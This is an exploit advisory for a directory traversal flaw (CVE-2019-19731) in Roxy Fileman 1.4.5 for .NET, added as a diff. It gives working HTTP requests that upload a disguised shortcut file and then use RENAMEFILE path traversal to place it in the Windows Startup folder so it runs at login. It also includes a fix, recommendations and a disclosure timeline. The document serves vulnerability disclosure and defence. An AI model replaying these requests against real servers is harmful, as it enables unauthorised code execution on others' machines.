@@ -1,0 +1,125 @@
+# Exploit Title: Roxy Fileman 1.4.5 - Directory Traversal
+# Author: Patrik Lantz
+# Date: 2019-12-06
+# Software: Roxy Fileman
+# Version: 1.4.5
+# Vendor Homepage: http://www.roxyfileman.com/
+# Software Link: http://www.roxyfileman.com/download.php?f=1.4.5-net
+# CVE: CVE-2019-19731
+
+Tested on: ASP.NET 4.0.30319 and Microsoft-IIS 10.0, Windows 10 Pro Build 17134 
+(using custom account as application pool identity for the IIS worker process).
+
+
+===========================
+Description
+===========================
+Roxy Fileman 1.4.5 for .NET is vulnerable to path traversal which can lead to file write in arbitrary locations depending on 
+the IIS worker process privileges. 
+This PoC demonstrates a crafted Windows shortcut file being uploaded and written to the Startup folder. The execution
+of this file will be triggered on the next login.
+
+
+Proof of Concept
+===========================
+
+It's possible to write an uploaded file to arbitrary locations using the RENAMEFILE action.
+The RenameFile function in main.ashx does not check if the new file name 'name' is a valid location.
+Moreover, the default conf.json has an incomplete blacklist for file extensions which in this case
+allows Windows shortcut files to be uploaded, alternatively existing files can be renamed to include 
+the .lnk extension.
+
+1) Create a shortcut file
+
+By using for example the target executable C:\Windows\System32\Calc.exe
+Remove the .lnk extension and rename it to use the .dat extension.
+
+
+2) Upload the file 
+
+Either upload the .dat file manually via the Roxy Fileman web interface
+or programmatically using a HTTP POST request. 
+
+Details of the request:
+
+POST /wwwroot/fileman/asp_net/main.ashx?a=UPLOAD HTTP/1.1
+Host: 127.0.0.1:50357
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: multipart/form-data; boundary=---------------------------159382831523528
+Content-Length: 924
+Origin: http://127.0.0.1:50357
+Connection: close
+Referer: http://127.0.0.1:50357/wwwroot/fileman/
+Cookie: roxyld=%2Fwwwroot%2Ffileman%2FUploads%2Ftest2; roxyview=list
+
+-----------------------------159382831523528
+Content-Disposition: form-data; name="action"
+
+upload
+-----------------------------159382831523528
+Content-Disposition: form-data; name="method"
+
+ajax
+-----------------------------159382831523528
+Content-Disposition: form-data; name="d"
+
+/wwwroot/fileman/Uploads/test2
+-----------------------------159382831523528
+Content-Disposition: form-data; name="files[]"; filename="poc.dat"
+Content-Type: application/octet-stream
+
+...data omitted...
+-----------------------------159382831523528--
+
+
+
+3) Write the file to the Startup folder using the RENAMEFILE action
+The new filename is set via the n parameter. The correct path can be identified by trial and error depending 
+on the location of wwwroot on the filesystem and the privileges for the IIS worker process (w3wp.exe).
+
+If the necessary directories do not exist, they can be created using the CREATEDIR action which also
+is vulnerable to path traversal.
+
+
+POST /wwwroot/fileman/asp_net/main.ashx?a=RENAMEFILE&f=%2Fwwwroot%2Ffileman%2FUploads%2FDocuments%2Fpoc.dat&n=../../../../../../../../AppData/Roaming/Microsoft/Windows/Start%20Menu/Programs/Startup/poc.txt.lnk HTTP/1.1
+Host: 127.0.0.1:50357
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0
+Accept: application/json, text/javascript, */*; q=0.01
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Content-Length: 66
+Origin: http://127.0.0.1:50357
+Connection: close
+Referer: http://127.0.0.1:50357/wwwroot/fileman/
+Cookie: roxyld=%2Fwwwroot%2Ffileman%2FUploads%2Ftest2; roxyview=list
+
+f=%2Fwwwroot%2Ffileman%2FUploads%2Ftest2%2Fpoc.dat&n=poc.dat
+
+
+
+Workaround / Fix:
+===========================
+
+Patch the main.ashx code in order to perform checks for all paths that they are valid in the following actions: 
+CREATEDIR, COPYFILE and RENAMEFILE.
+
+Recommendations for users of Roxy Fileman:
+  - Add lnk file extension to the conf.json under FORBIDDEN_UPLOADS, and aspx since it is not included in the blacklist by default.
+
+
+
+Timeline
+===========================
+2019-12-06: Discovered the vulnerability
+2019-12-06: Reported to the vendor (vendor is unresponsive)
+2019-12-11: Request CVE
+2019-12-13: Advisory published
+
+Discovered By:
+===========================
+Patrik Lantz
